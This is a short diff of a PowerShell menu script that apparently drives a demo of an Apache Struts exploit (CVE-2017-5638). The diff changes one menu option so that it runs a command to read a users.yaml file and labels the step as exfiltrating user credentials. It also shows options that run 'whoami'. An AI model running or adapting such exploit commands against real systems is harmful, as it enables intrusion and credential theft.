@@ -5,7 +5,7 @@ While ($true) {
     Write-Host "1: Run with whoami command"
     Write-Host "a: Run with attacking and hack password"
     Write-Host "e: Exit"
-    $s = Read-Host ""
+    $s = Read-Host "option"
     switch ($s.Trim()) {
         '0' {
             Write-Host "Running in safe demo mode...`n"
@@ -16,8 +16,8 @@ While ($true) {
             .\exploit_cve_2017_5638.ps1 -Command "whoami"
         }
         'a' {
-            Write-Host "Running attack script...`n"
-            .\exploit_cve_2017_5638.ps1 -Target "http://10.0.0.5:8080/upload.action" -Command "id"
+            Write-Host "Running attack script - exfiltrating user credentials...`n"
+            .\exploit_cve_2017_5638.ps1 -Command "type data\users.yaml"
         }
         'e' {
             Write-Host "Exiting...`n"
